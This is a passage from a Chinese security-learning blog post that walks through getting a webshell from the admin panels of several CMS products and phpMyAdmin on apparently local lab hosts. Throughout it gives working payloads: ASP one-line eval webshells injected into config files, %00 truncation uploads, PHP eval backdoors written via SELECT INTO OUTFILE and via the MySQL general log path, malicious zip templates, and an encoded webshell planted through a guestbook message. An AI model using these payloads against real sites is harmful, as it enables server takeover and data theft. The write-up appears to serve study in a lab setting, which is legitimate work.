+<p>字符类型闭合和数字闭合依次如下：</p>
+<p>字符型用双引号闭合</p>
+<pre class="line-numbers language-none"><code class="language-none">"%&gt;&lt;%eval request(chr(35))%&gt;&lt;% 
+%&gt;&lt;%eval request(chr(35))%&gt;&lt;%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>接下来我们找没有被过滤的地方</p>
+<p><img src="/2021/12/04/day35/image-20211205141435233.png" alt="image-20211205141435233"></p>
+<p>修改后再config配置文件中查看</p>
+<p><img src="/2021/12/04/day35/image-20211205141538658.png" alt="image-20211205141538658"></p>
+<p>此处不行</p>
+<p>我们又发现了类似于之前的模板修改</p>
+<p><img src="/2021/12/04/day35/image-20211205141716293.png" alt="image-20211205141716293"></p>
+<p>但是后缀为html，我们需要修改后缀，这里需要让后缀为asp，抓包试下</p>
+<p><img src="/2021/12/04/day35/image-20211205141905992.png" alt="image-20211205141905992"></p>
+<p>改为asp后发现出错，这里也不行</p>
+<p><img src="/2021/12/04/day35/image-20211205141942901.png" alt="image-20211205141942901"></p>
+<p>接着我们再扩展功能-幻灯片设置这里，发现这里也是对配置文件进行修改</p>
+<p><img src="/2021/12/04/day35/image-20211205142310658.png" alt="image-20211205142310658"></p>
+<p>接着我们需要找的是没被过滤的地方，尝试后说明文字加双引号也被过滤</p>
+<p>所以我们尝试数字这里，抓包</p>
+<p><img src="/2021/12/04/day35/image-20211205142535447.png" alt="image-20211205142535447"></p>
+<p>我们再这里尝试1后加一句话</p>
+<pre class="line-numbers language-none"><code class="language-none">%&gt;&lt;%eval request(chr(35))%&gt;&lt;%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>一句话做url编码</p>
+<p><img src="/2021/12/04/day35/image-20211205142955556.png" alt="image-20211205142955556"></p>
+<p>最后如下</p>
+<pre class="line-numbers language-none"><code class="language-none">slidestyle=1%25&gt;&lt;%25eval+request(chr(35))%25&gt;&lt;%25<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们查看靶机的配置文件</p>
+<p><img src="/2021/12/04/day35/image-20211205143129585.png" alt="image-20211205143129585"></p>
+<p><img src="/2021/12/04/day35/image-20211205143351022.png" alt="image-20211205143351022"></p>
+<p>连接地址</p>
+<pre class="line-numbers language-none"><code class="language-none">http://www.cbi3.com/config/AspCms_Config.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功拿到了webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205143409093.png" alt="image-20211205143409093"></p>
+<h3 id="南方数据企业系统getshell"><a href="#南方数据企业系统getshell" class="headerlink" title="南方数据企业系统getshell"></a>南方数据企业系统getshell</h3><p>先进入后台，</p>
+<pre class="line-numbers language-none"><code class="language-none">http://www.cbi7.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211205143627058.png" alt="image-20211205143627058"></p>
+<p>admin 123456进入</p>
+<p><img src="/2021/12/04/day35/image-20211205143650958.png" alt="image-20211205143650958"></p>
+<h4 id="上传截断getshell"><a href="#上传截断getshell" class="headerlink" title="上传截断getshell"></a>上传截断getshell</h4><p>这里找是否能直接上传脚本文件</p>
+<p><img src="/2021/12/04/day35/image-20211205144348110.png" alt="image-20211205144348110"></p>
+<p>看到这里有个上传点</p>
+<p>直接上传asp脚本文件</p>
+<p><img src="/2021/12/04/day35/image-20211205144718721.png" alt="image-20211205144718721"></p>
+<p>防止体量太小前面加点字符</p>
+<p>一句话</p>
+<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval request("123")%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>直接上传asp文件发现不允许上传</p>
+<p><img src="/2021/12/04/day35/image-20211205144836780.png" alt="image-20211205144836780"></p>
+<p>但是我们在这里发现，上传时可以选择目录路径，猜测它上传时放到目录下，我们这里想必可以使用%00截断来上传asp文件</p>
+<p><img src="/2021/12/04/day35/image-20211205144916360.png" alt="image-20211205144916360"></p>
+<p>首先修改文件名称</p>
+<p><img src="/2021/12/04/day35/image-20211205145124183.png" alt="image-20211205145124183"></p>
+<p>然后修改目录路径做%00截断，截断后仍作为asp格式上传上去</p>
+<p><img src="/2021/12/04/day35/image-20211205145311787.png" alt="image-20211205145311787"></p>
+<p>做了url decode后</p>
+<p><img src="/2021/12/04/day35/image-20211205145338867.png" alt="image-20211205145338867"></p>
+<p>可以看到成功上传了</p>
+<p><img src="/2021/12/04/day35/image-20211205145417792.png" alt="image-20211205145417792"></p>
+<p>上传路径也显示出来了</p>
+<pre class="line-numbers language-none"><code class="language-none">http://www.cbi7.com/Upload/PicFiles/2.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到了webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205145648721.png" alt="image-20211205145648721"></p>
+<h4 id="修改配置文件getshell-1"><a href="#修改配置文件getshell-1" class="headerlink" title="修改配置文件getshell"></a>修改配置文件getshell</h4><p>这里我们也在找找这种方法getshell</p>
+<p>我们在系统管理-网站信息设置里</p>
+<p><img src="/2021/12/04/day35/image-20211205151555992.png" alt="image-20211205151555992"></p>
+<p>发现单引号不会出错，双引号内部服务器出错</p>
+<p>但是这里我们需要用双引号闭合</p>
+<p><img src="/2021/12/04/day35/image-20211205151851951.png" alt="image-20211205151851951"></p>
+<p>我们构造一句话</p>
+<pre class="line-numbers language-none"><code class="language-none">"%&gt;&lt;%eval request(chr(35))%&gt;&lt;%s="<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>“闭合前面的”</p>
+<p>%&gt;闭合前面的&lt;%</p>
+<p>中间写入asp一句话</p>
+<p>&lt;%闭合后面的%&gt;</p>
+<p>s=”闭合后面的”</p>
+<p><img src="/2021/12/04/day35/image-20211205153113289.png" alt="image-20211205153113289"></p>
+<p>虽然双引号闭合报内部服务器错误，但是我们用蚁剑连接发现可以连接</p>
+<p>连接路径</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi7.com/Inc/Const.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205153435344.png" alt="image-20211205153435344"></p>
+<p>我们在系统管理-常量设置，找到了系统的配置文件修改，这里显然也可插入一句话</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%eval request(chr(35))%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211205153733141.png" alt="image-20211205153733141"></p>
+<p>直接再最后加入一句话</p>
+<p>因为修改的是同一个常量文件，所以还是上面的路径</p>
+<p>连接拿到了webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205153856792.png" alt="image-20211205153856792"></p>
+<h3 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h3><p>我们打开phpstudy，安装phpmyadmin，登录phpmyadmin</p>
+<h4 id="执行sql命令-getshell"><a href="#执行sql命令-getshell" class="headerlink" title="执行sql命令 getshell"></a>执行sql命令 getshell</h4><p>登录phpmyadmin后，我们可以使用into outfile写入后门</p>
+<pre class="line-numbers language-none"><code class="language-none">select '&lt;?php phpinfo();eval($_POST[123]);?&gt;' into outfile 'D:/phpstudy_pro/WWW/www.k123.com/x.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>必须写入网站目录下，一句话后门才能被解析</p>
+<p><img src="/2021/12/04/day35/image-20211206140346154.png" alt="image-20211206140346154"></p>
+<p>命令无法执行因为在安装MySQL的时候限制了导入与导出的目录权限。只允许在规定的目录下才能导入，需要修改mysql配置文件</p>
+<p>我们可以去掉导入的目录限制，再mysql配置文件中加入</p>
+<pre class="line-numbers language-none"><code class="language-none">secure_file_priv =<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206141119198.png" alt="image-20211206141119198"></p>
+<p>修改后重启mysql命令即可执行</p>
+<p><img src="/2021/12/04/day35/image-20211206141157093.png" alt="image-20211206141157093"></p>
+<p>可以再网站根目录下看到确实写入了</p>
+<p><img src="/2021/12/04/day35/image-20211206141253499.png" alt="image-20211206141253499"></p>
+<p><img src="/2021/12/04/day35/image-20211206141310856.png" alt="image-20211206141310856"></p>
+<p>成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206141345792.png" alt="image-20211206141345792"></p>
+<h4 id="mysql日志文件getshell"><a href="#mysql日志文件getshell" class="headerlink" title="mysql日志文件getshell"></a>mysql日志文件getshell</h4><p>我们利用mysql的日志文件写入shell，这个日志文件可以通过phpmyadmin，修改他的存放位置和后缀</p>
+<p>首先我们再phpmyadmin中开启日志记录</p>
+<pre class="line-numbers language-none"><code class="language-none">SET global general_log = "ON";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206143401203.png" alt="image-20211206143401203"></p>
+<p>我们可以在常量处查看是否修改</p>
+<p><img src="/2021/12/04/day35/image-20211206143527364.png" alt="image-20211206143527364"></p>
+<p>然后我们给日志一个保存路径，并且附加后缀</p>
+<p>保存好原有路径，测试完后改回去</p>
+<pre class="line-numbers language-none"><code class="language-none">D:\phpstudy_pro\Extensions\MySQL5.7.26\data\WIN-GB0DQ04MBCM.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">SET global general_log_file ='D:/phpstudy_pro/WWW/www.k123.com/a.php';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206143613853.png" alt="image-20211206143613853"></p>
+<p>然后我们搜索一句话会被日志记录下来</p>
+<pre class="line-numbers language-none"><code class="language-none">select '&lt;?php phpinfo();eval($_POST[123]);?&gt;'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206143630319.png" alt="image-20211206143630319"></p>
+<p><img src="/2021/12/04/day35/image-20211206143702026.png" alt="image-20211206143702026"></p>
+<p>可以看到日志记录在了网站目录下，并且我们查询的一句话被记录下了</p>
+<p>此时我们的一句话后门就会被解析</p>
+<p><img src="/2021/12/04/day35/image-20211206143756850.png" alt="image-20211206143756850"></p>
+<p>并且成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206143826077.png" alt="image-20211206143826077"></p>
+<h3 id="pageadmin-getshell"><a href="#pageadmin-getshell" class="headerlink" title="pageadmin getshell"></a>pageadmin getshell</h3><p>还是先登录后台管理，</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi9.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206144711456.png" alt="image-20211206144711456"></p>
+<p>admin 123456进入</p>
+<p><img src="/2021/12/04/day35/image-20211206144735476.png" alt="image-20211206144735476"></p>
+<h4 id="上传模块getshell"><a href="#上传模块getshell" class="headerlink" title="上传模块getshell"></a>上传模块getshell</h4><p>进入后台后，我们首先在工具-文件管理处寻找，</p>
+<p><img src="/2021/12/04/day35/image-20211206145259379.png" alt="image-20211206145259379"></p>
+<p>这里我们发现可以改名，我们尝试后发现不能修改为php、asp等的后缀名，做了限制</p>
+<p>然后我们在功能中发现了上传文件</p>
+<p><img src="/2021/12/04/day35/image-20211206145410768.png" alt="image-20211206145410768"></p>
+<p>经尝试发现不能上传php、asp后缀文件</p>
+<p>功能中还有个模板安装，允许上传zip格式文件</p>
+<p><img src="/2021/12/04/day35/image-20211206145538460.png" alt="image-20211206145538460"></p>
+<p>我们这里尝试把一句话压缩为zip格式上传</p>
+<p><img src="/2021/12/04/day35/image-20211206145837611.png" alt="image-20211206145837611"></p>
+<p>发现可以上传</p>
+<p>安装后我们在Templates/1 中找到了我们上传的模板</p>
+<p><img src="/2021/12/04/day35/image-20211206150020825.png" alt="image-20211206150020825"></p>
+<p>路径</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi9.com/Templates/1/1.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206150217309.png" alt="image-20211206150217309"></p>
+<p>到这里我们发现一个事，既然zip上传可行，我们刚才的文件上传是不是也可以上传zip格式</p>
+<p><img src="/2021/12/04/day35/image-20211206151647010.png" alt="image-20211206151647010"></p>
+<p>尝试之后发现上传上去了，我们把它解压即可getshell，就不演示了</p>
+<h4 id="利用配置文件中的数据库连接信息getshell"><a href="#利用配置文件中的数据库连接信息getshell" class="headerlink" title="利用配置文件中的数据库连接信息getshell"></a>利用配置文件中的数据库连接信息getshell</h4><p>我们在文件管理中发现了后缀为config的配置文件</p>
+<p><img src="/2021/12/04/day35/image-20211206152126179.png" alt="image-20211206152126179"></p>
+<p>查看后我们发现了数据库的连接信息</p>
+<p><img src="/2021/12/04/day35/image-20211206152209725.png" alt="image-20211206152209725"></p>
+<p>我们用数据库客户端连接它</p>
+<p>user id为SA应该是个SQL server数据库</p>
+<p><img src="/2021/12/04/day35/image-20211206152644413.png" alt="image-20211206152644413"></p>
+<p><img src="/2021/12/04/day35/image-20211206152735065.png" alt="image-20211206152735065"></p>
+<p>成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206152803532.png" alt="image-20211206152803532"></p>
+<h3 id="无忧企业系统-getshell"><a href="#无忧企业系统-getshell" class="headerlink" title="无忧企业系统 getshell"></a>无忧企业系统 getshell</h3><p>还是先找后台管理进入</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi18.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206162717194.png" alt="image-20211206162717194"></p>
+<p>admin 123456进入</p>
+<p><img src="/2021/12/04/day35/image-20211206162737260.png" alt="image-20211206162737260"></p>
+<h4 id="上传文件getshell"><a href="#上传文件getshell" class="headerlink" title="上传文件getshell"></a>上传文件getshell</h4><p>进入后台后我们发现上传点</p>
+<p><img src="/2021/12/04/day35/image-20211206163843622.png" alt="image-20211206163843622"></p>
+<p>但是发现asp、php等的后缀无法上传</p>
+<p><img src="/2021/12/04/day35/image-20211206163912432.png" alt="image-20211206163912432"></p>
+<p>看到只允许xxx的，显然做了一个白名单，而且我们在网站设置处发现了这个白名单设置</p>
+<p><img src="/2021/12/04/day35/image-20211206164017460.png" alt="image-20211206164017460"></p>
+<p>那我们只需要把我们想要上传的后缀加上去上传即可，就不演示了</p>
+<h4 id="留言一句话到数据库getshell"><a href="#留言一句话到数据库getshell" class="headerlink" title="留言一句话到数据库getshell"></a>留言一句话到数据库getshell</h4><p>如果access数据库是asp格式，我们可以插入一句话到数据库，访问数据库即可getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206164209421.png" alt="image-20211206164209421"></p>
+<p>我们通过留言来写入一句话</p>
+<p><img src="/2021/12/04/day35/image-20211206164515043.png" alt="image-20211206164515043"></p>
+<p>在网站前台留言，然后再后台回复一句话</p>
+<pre class="line-numbers language-none"><code class="language-none">┼攠數畣整爠煥敵瑳∨≡┩愾 密码a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206164636158.png" alt="image-20211206164636158"></p>
+<p>这样我们的一句话就插入到数据库里</p>
+<p>我们可以直接通过数据库路径访问</p>
+<p><img src="/2021/12/04/day35/image-20211206164803721.png" alt="image-20211206164803721"></p>
+<p>asp文件名字需要url编码</p>
+<p><img src="/2021/12/04/day35/image-20211206164836249.png" alt="image-20211206164836249"></p>
+<p>500错误证明我们的一句话写入了</p>
+<pre class="line-numbers language-none"><code class="language-none">http://www.cbi18.com/Databases/%25%23%40%24%40%23%46%44%53%40%23%24%25%25%23.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206164910522.png" alt="image-20211206164910522"></p>
+<p>我们也可以将数据库备份为asp文件，然后通过备份的路径访问webshell</p>
+<p><img src="/2021/12/04/day35/image-20211206165007766.png" alt="image-20211206165007766"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">晓莎K</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://0x00xiaoshaK.github.io/2021/12/04/day35/">http://0x00xiaoshaK.github.io/2021/12/04/day35/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">晓莎K</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0getshell/">
+                                    <span class="chip bg-color">网站后台getshell</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'DJnY4XDNchYmzLpD8IASjSjf-gzGzoHsz',
+        appKey: '3tkas9StBY5fsrGt1BVtPNOt',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/12/09/day36/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="常见的中间件">
+                        
+                        <span class="card-title">常见的中间件</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            中间件漏洞
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-09
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    漏洞
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
+                        <span class="chip bg-color">中间件</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/11/15/day34/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="burp详解">
+                        
+                        <span class="card-title">burp详解</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            burpsuite的使用系统的放点东西，借鉴为主，供参考。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
+                                    工具
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/burpsuite%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                        <span class="chip bg-color">burpsuite的使用</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
